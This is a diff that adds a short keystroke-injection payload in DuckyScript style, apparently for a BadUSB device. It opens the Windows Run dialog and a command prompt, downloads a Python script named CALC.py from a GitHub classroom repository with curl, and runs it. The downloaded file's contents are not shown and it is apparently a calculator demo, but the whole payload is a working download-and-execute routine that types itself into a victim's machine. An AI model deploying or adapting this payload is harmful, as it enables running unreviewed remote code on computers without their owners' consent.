@@ -1,0 +1,7 @@
+GUI r
+DELAY 1200
+STRINGLN cmd
+DELAY 1200
+STRINGLN curl https://raw.githubusercontent.com/Capaseztel/Shits-I-Made-In-Class/main/Calculator/CALC.py --output CALC.py
+DELAY 1200
+STRINGLN python3 CALC.py
